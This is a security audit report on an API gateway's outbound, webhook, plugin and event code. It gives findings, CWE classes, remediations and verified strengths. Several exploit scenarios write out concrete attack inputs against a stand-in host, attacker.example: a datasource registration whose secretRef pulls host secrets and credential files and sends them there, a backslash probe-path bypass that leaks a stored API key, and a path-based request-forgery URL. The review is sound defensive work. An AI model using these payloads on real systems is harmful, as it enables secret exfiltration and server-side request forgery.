# Security review: outbound / plugins / webhooks / events (Autheris)

### High — Governance admin can read or overwrite arbitrary host secrets via datasource `Auth.SecretRef` and exfiltrate them to an attacker host
- **File:** `src/Autheris.Application/Catalog/Services/CatalogDiscoveryService.cs:337-349`, `src/Autheris.Application/DataCatalog/Services/OpenApiIngestionService.cs:196-230`, `src/Autheris.Application/Catalog/Services/DatasourceTestingService.cs:239-262`, `src/Autheris.Infrastructure/Security/DefaultEnvironmentSecretProvider.cs:35-40,45-48,80-160`
- **CWE:** CWE-522 / CWE-668 / CWE-269
- **Confidence:** Confirmed (code path traced; not executed end-to-end)
- **Issue:** `DatasourceAuthDto.SecretRef` is caller-controlled and is used verbatim as the vault key. `DefaultEnvironmentSecretProvider.GetSecretBytes` resolves a reference against (a) the in-memory override map, (b) `file:/run/secrets/*`, (c) ANY `IConfiguration` key (`ConnectionStrings:...`, `Gateway:Authentication:...`) and (d) ANY environment variable name. There is no namespace restriction (e.g. `datasource:{domain}:...`). The ingested table stores `ApiKeySecretName = auth.SecretRef`, `ApiKeyHeaderName = auth.Name` and a `BaseUrl` taken from the spec `servers[0].url`/`BaseUrl`. For that URL only `EgressUrlPolicy.ValidateStatic` runs, so any public HTTPS host passes. Also, when `Value`/`ClientSecret` is supplied together with a chosen `SecretRef`, `SetSecret` writes into `_inMemorySecrets`, which has the highest lookup priority and silently shadows the real secret.
- **Exploit scenario:** A GovernanceAdmin (not a cluster admin) calls `POST /api/v1/catalog/datasources` with `spec.servers[0].url=https://attacker.example`, `auth={type:"apiKey",name:"X-Leak",secretRef:"Gateway:Authentication:ForwardAuth:SharedSecret"}` (or `ConnectionStrings__Governance`, `file:/run/secrets/db_password`) and then `POST /api/v1/catalog/datasources/{domain}/test` (GovernanceAdmin as well). `TestHttpDatasourceAsync` resolves the secret and sends it as the `X-Leak` header to attacker.example. The table is created inactive, but the test endpoint does not require it to be active. Integrity variant: `auth={type:"apiKey",value:"known",secretRef:"forwardauth-secret"}` (or `hmac-masking-secret`, `audit-hmac-key`) replaces the process-wide secret in memory with an attacker-known value, which allows forging ForwardAuth identity and masking/audit HMACs.
- **Remediation:** Force a namespace and reject everything else: `if (!secretRef.StartsWith($"datasource:{domain}:", StringComparison.OrdinalIgnoreCase) || secretRef.Contains("file:", ...) ) throw new SecurityException(...)`. Never use caller-supplied refs as an `IConfiguration`/environment lookup. In `DefaultEnvironmentSecretProvider.SetSecret`, accept only the `datasource:` prefix and refuse to overwrite names that match well-known aliases. Keep the secret-name to allowed-host binding (only send a secret to the host recorded at registration).

### Medium — Datasource probe path validation bypass (`\/host`, `https:\\host`) redirects probe, with the stored API key, to another host
- **File:** `src/Autheris.Application/Catalog/Services/DatasourceTestingService.cs:140-170,239-262`
- **CWE:** CWE-918 / CWE-601
- **Confidence:** Confirmed (URI behaviour verified on .NET 10: `new Uri("https://api.example.com/v1/")` + `\/evil.com/x` gives `https://evil.com/x`; `https:\\evil.com` gives `https://evil.com/`)
- **Issue:** `RelativeProbePath` is rejected only if it starts with `http://`, `https://`, `//` or contains `..`. Backslash forms are not caught, and `Uri.TryCreate(baseUri, relativePath, ...)` re-roots the host. `EgressUrlPolicy.ValidateResolvedAsync` only checks that the new host is public. The datasource's `StaticApiKey` header is then added to the request, and the same-host constraint between `baseUri` and `probeUri` is never checked.
- **Exploit scenario:** A GovernanceAdmin tests an existing legitimately configured datasource with `{"relativeProbePath":"\\/attacker.example/x"}`. The gateway sends the real vaulted API key to attacker.example, which converts "can test a datasource" into "can read its credential" (cross-domain, and possibly cross-tenant because the datasource lookup in `TestDatasourceAsync` matches by id/name/domain without a tenant filter).
- **Remediation:** After `TryCreate`, assert `probeUri.Scheme == baseUri.Scheme && probeUri.Host.Equals(baseUri.Host, OrdinalIgnoreCase) && probeUri.Port == baseUri.Port` and that `probeUri.AbsolutePath` starts with the base path. Reject any `\`, `:` in the first segment and control characters. Better: build with `new UriBuilder(baseUri){ Path = ..., Query = ... }`.

### Medium — Traffic shadowing replay lets an absolute URL in the request path override the staging target
- **File:** `src/Autheris.Application/Diagnostics/Shadowing/TrafficShadowingService.cs:185-188`, `src/Autheris.Api/Middleware/TrafficShadowingMiddleware.cs:46-76`
- **CWE:** CWE-918
- **Confidence:** Likely (URI resolution verified: `new Uri(new Uri("https://stage.example.com/"), "http://evil.com/x")` returns `http://evil.com/x`; end-to-end middleware ordering not run)
- **Issue:** `new Uri(targetBaseUri, request.PathAndQuery.TrimStart('/'))` treats a path like `/https://evil.example/graphql` as an absolute URI. The middleware only requires that the path contains `/graphql`, `/api/sql` or `/websql`, and it runs before endpoint routing results are enforced (a path that matches no endpoint never triggers authorization). The primary handler's ConnectCallback and SsrfProtectionHandler stop private/metadata targets, but any public host is allowed, and plain `http://` is permitted by the absolute URL (the base-URL HTTPS check is bypassed).
- **Exploit scenario:** With shadowing enabled (sampled), anyone, including unauthenticated callers, sends `POST /https://attacker.example/graphql` with an empty body. The gateway replays a request to attacker.example with the forwarded header allow-list (`traceparent`, `User-Agent`, `X-Request-Id`...) and, for non-empty safe bodies, the redacted body. This is a blind request-forgery and traffic-amplification primitive from the gateway's IP, and it also exfiltrates the (redacted) shape of production queries submitted by legitimate users who are tricked into using the URL.
- **Remediation:** Build the target with `UriBuilder`: `var rel = request.PathAndQuery; if (!rel.StartsWith('/') || rel.Contains("://") ...) drop;` then `new Uri(targetBaseUri, "." + rel)` and verify `targetUri.Host == targetBaseUri.Host && targetUri.Scheme == targetBaseUri.Scheme`. In the middleware only enqueue when the request resolved to an endpoint (`context.GetEndpoint() != null`) and the user is authenticated.

### Medium — Tenant scoping of event webhooks is fail-open and most events carry no tenant
- **File:** `src/Autheris.Domain/Options/WebhooksOptions.cs:23-33`, `src/Autheris.Application/Governance/Services/AccessPlanningService.cs:152-159,306-313,430-438`, `src/Autheris.Api/Endpoints/DocIngestionEndpoints.cs:118-126`, `src/Autheris.Application/Webhooks/WebhookDispatcherService.cs:55-57`
- **CWE:** CWE-285 / CWE-359
- **Confidence:** Confirmed
- **Issue:** `AccessPlanCreatedEvent`, `AccessPlanAppliedEvent`, `DatasetStateChangedEvent` and `DocumentDepositedEvent` are published without `TenantId` (and without `CorrelationId`). A subscription with a `TenantId` can therefore never match them (`string.Equals(TenantId, null)` is false), so operators who want those events must create tenant-less subscriptions. A tenant-less subscription matches every tenant's events (`EventFilters` empty or `*` = everything, including `security.alert` with `SourceIp`/`UserSid` and `security.policy.denied` with the ABAC denial reasons). The tenant isolation therefore exists only as an opt-in field on the subscription, and the event producers do not populate its counterpart.
- **Exploit scenario:** Operator of tenant A configures `Webhooks:Subscriptions[0]` (target: tenant A's SIEM/Slack, `EventFilters:["*"]`, no `TenantId`, because tenant-scoped subscriptions would not receive governance events). Tenant B's security alerts, denied-policy reasons, dataset IDs and user SIDs are delivered to tenant A's endpoint. Plugin event listeners (`IPluginEventListener<IGatewayEvent>`) get the same unscoped stream.
- **Remediation:** Make `TenantId` required for `IGatewayEvent` (non-nullable on the interface or enforced in `IGatewayEventBus.PublishAsync`; resolve from `RequestContext`) and populate it at every producer. In `WebhookSubscription.MatchesEvent` treat an empty subscription tenant as "platform-level" only for events explicitly flagged as platform events; otherwise fail closed. Validate at startup (`IValidateOptions`) that each subscription has either a `TenantId` or an explicit `AllTenants: true`.

### Medium — Event delivery to webhooks and plugins runs inline on the request path with unbounded fan-out (no per-event timeout, no rate limit)
- **File:** `src/Autheris.Application/Events/InMemoryGatewayEventBus.cs:46-62,119-136`, `src/Autheris.Application/Webhooks/WebhookDispatcherService.cs:64-143`, `src/Autheris.Application/Mcp/Services/AiDataGuardrailService.cs:194-204,413-423`, `src/Autheris.Infrastructure/Plugins/PluginManager.cs:286-302`
- **CWE:** CWE-400 / CWE-770
- **Confidence:** Confirmed
- **Issue:** `PublishAsync` awaits `Task.WhenAll` of all subscribers. The webhook bridge awaits `DispatchEventAsync`, which awaits every matching subscription including retry loops (`MaxRetries` is an unvalidated int, backoff `2^attempt*100` ms, per-try timeout `DefaultTimeoutSeconds`=5). Plugin listeners are invoked through reflection with no timeout; a listener that blocks or never completes blocks the publishing request forever (the bus swallows exceptions but not hangs). Several publishers sit in user-reachable paths (`security.alert` on every blocked prompt injection, `security.policy.denied` on every ABAC denial).
- **Exploit scenario:** A low-privileged MCP user sends a stream of prompt-injection strings. Each request triggers one `SecurityAlertEvent` and the request thread waits for the webhook receiver (up to `MaxRetries x 5 s`); if the receiver is slow or down, request latency and thread-pool usage grow linearly with attacker traffic, and the receiver (e.g. Slack/SIEM) is flooded with one POST per attempt, with no deduplication or rate cap. A hanging plugin handler gives the same effect with no timeout at all.
- **Remediation:** Decouple publish from delivery: a bounded `Channel<IGatewayEvent>` (`BoundedChannelFullMode.DropOldest`/`DropWrite`, capacity from options) drained by a hosted worker with limited concurrency. Cap `MaxRetries` (e.g. `Math.Clamp(..., 1, 5)`), add jitter, a per-subscription circuit breaker, and wrap plugin handler calls in `CancellationTokenSource.CreateLinkedTokenSource(ct).CancelAfter(...)` plus `Task.WaitAsync(timeout)`.

### Low — CloudEvents webhook signature has no timestamp (replayable) and omits the signed headers
- **File:** `src/Autheris.Application/Events/Services/CloudEventWebhookDispatcher.cs:99-110`
- **CWE:** CWE-294
- **Confidence:** Confirmed
- **Issue:** `X-Autheris-Signature` is `HMAC(secret, payloadJson)` only. There is no timestamp or delivery id in the MAC input, so a captured delivery can be replayed indefinitely; `ce-tenantid`/`ce-time` headers are unsigned. (The sibling `WebhookDispatcherService` correctly signs `"{timestamp}.{payload}"`.) The hex is also compared receiver-side by whatever the consumer implements; no verification helper is provided.
- **Exploit scenario:** An attacker who observes one delivery (log, proxy) replays it to the receiver at any time; the receiver's HMAC check passes.
- **Remediation:** Add `X-Autheris-Timestamp` and sign `$"{timestamp}.{payloadJson}"` like `WebhookDispatcherService`; document a 5-minute tolerance and `ce-id` dedupe on the receiver.

### Low — Webhook with empty secret is sent with an empty `sha256=` signature header; target URLs (with embedded tokens) are logged
- **File:** `src/Autheris.Application/Webhooks/WebhookDispatcherService.cs:96-98,114-137,148-153`; `src/Autheris.Application/Events/Services/CloudEventWebhookDispatcher.cs:140-143,168-171`; `src/Autheris.Api/Endpoints/StreamingCdcEndpoints.cs:146-148`
- **CWE:** CWE-532 / CWE-347 / CWE-209
- **Confidence:** Confirmed
- **Issue:** (1) `ComputeHmacSha256` returns `""` for an empty secret, and the dispatcher still sends `X-Autheris-Signature-256: sha256=` instead of refusing to dispatch, so a misconfigured subscription silently becomes unauthenticated. (2) `subscription.TargetUrl` (commonly `https://hooks.slack.com/.../TOKEN`, `?token=`, or `user:pass@`) is written verbatim to Warning/Error logs on every failure. (3) The subscription POST returns `ex.Message` of the SSRF check, which contains the resolved IP address ("restricted address '10.x.x.x'") and acts as an internal DNS/IP oracle for any TenantAdmin.
- **Exploit scenario:** Anyone with log read access harvests webhook tokens; a TenantAdmin probes internal DNS names to learn their private IPs.
- **Remediation:** Fail validation when `Secret` is empty (options validator) and skip dispatch otherwise; log only `scheme://host` (`uri.GetLeftPart(UriPartial.Authority)`) and reject URLs with `UserInfo`; return a generic "Target URL blocked by egress policy" message to the caller.

### Low — Domain events leak server filesystem path and internal policy detail to webhooks/plugins
- **File:** `src/Autheris.Api/Endpoints/DocIngestionEndpoints.cs:118-126`, `src/Autheris.Domain/Events/GatewayEventModels.cs` (`DocumentDepositedEvent.SourceFilePath`, `PolicyDeniedEvent.Reason`, `SecurityAlertEvent.Details/SourceIp`)
- **CWE:** CWE-200
- **Confidence:** Confirmed
- **Issue:** `DocumentDepositedEvent.SourceFilePath` is the absolute on-disk path (`result.FilePath`) and the whole record is serialized into the CloudEvent `data`. `PolicyDeniedEvent` carries the verbatim ABAC denial reasons while the client only receives a generic message.
- **Exploit scenario:** Any webhook receiver or plugin learns the container layout and the policy rules that the gateway deliberately hides from the denied caller.
- **Remediation:** Emit a document-relative id (`appId/category/docId`) instead of the path; map events to an explicit external DTO (allow-list of fields) before serialization rather than serializing `@event`.

### Low — OpenAPI spec download has no response size cap
- **File:** `src/Autheris.Application/Catalog/Services/CatalogDiscoveryService.cs:313-326`
- **CWE:** CWE-770
- **Confidence:** Likely
- **Issue:** `HttpClient.GetStringAsync(specUri)` buffers the whole body (up to 2 GB `MaxResponseContentBufferSize` default) in memory; only a 30 s timeout applies. A new `HttpClient`/`SocketsHttpHandler` is also created per call. (SSRF, redirect and rebinding handling is correct here.)
- **Exploit scenario:** GovernanceAdmin (or a compromised account) registers a spec URL pointing to a streaming multi-GB response and exhausts gateway memory.
- **Remediation:** Set `httpClient.MaxResponseContentBufferSize = 10 * 1024 * 1024`, use `ResponseHeadersRead` with a length-limited `ReadAsStreamAsync`, and cap `SpecContent` by length.

## Verified strengths
- Webhook dispatch uses `AddSecureOutboundHandlers`: `SocketsHttpHandler` with `AllowAutoRedirect=false`, `UseProxy=false` and a `ConnectCallback` that resolves and pins every candidate IP (mixed answers rejected, IPv4-mapped IPv6 normalised); DNS rebinding between `ValidateResolvedAsync` and connect is therefore closed for both webhook dispatchers, traffic shadowing and catalog clients.
- `WebhookDispatcherService` signs `"{timestamp}.{payload}"` with HMAC-SHA256 and sends the timestamp header; `CloudEventWebhookDispatcher` blocks Host/Proxy-*/X-Forwarded-*/ce-*/signature custom headers.
- Subscription API: server-generated ids, tenant taken from the resolved request context, per-tenant cap (100), secrets redacted in responses, role-gated (GovernanceAdmin/TenantAdmin).
- Plugin loading: hash allow-list (config is the trust anchor, manifest only as consistency check), hash-verified bytes are the bytes loaded (no TOCTOU for managed assemblies), dependencies and native libs checked, fail-closed outside Development, collectible ALC, listener exceptions caught and logged, bus isolates subscriber failures.
- Doc bundle extraction: entry-count and size limits, traversal checks, canonical-path prefix check; verified that .NET truncates extraction at the declared entry length so a lying central-directory size does not bypass the 100 MB cap.
- Traffic shadowing: bounded channel with DropWrite, header allow-list, body/query redaction, AST write-guard.
- OpenAPI ingestion creates tables inactive and the governance ratchet prevents weakening existing tables; no `TypeNameHandling`/polymorphic deserialization found in scope.

## Areas not covered
- `ICloudEventSubscriptionStore` / `ICloudEventWebhookDispatcher` have no consumer in `src` besides the endpoints (CDC to webhook delivery wiring not found), so the CloudEvents path was reviewed as a library only.
- Plugins receive the root `IServiceProvider` via `ActivatorUtilities` (full host capability by design; ALC is not a security boundary). `IPluginActionHandler.ExecuteActionAsync` has no caller in scope; its `ex.Message` return was not traced to a response.
- Not read in depth: Dbt, SchemaRegistry, Mesh (Envoy ExtAuthz), FinOps, Lineage impact analyzer/PDF exporter, Workflows, Observability, `DeclarativeHttpDataSourceExecutor` URL building (outside the listed directories), `IDataCatalogWebhookHandler`/`ItsmWebhookHandler` implementations (live in Extensions), and the Redis/event-bus channel implementation.
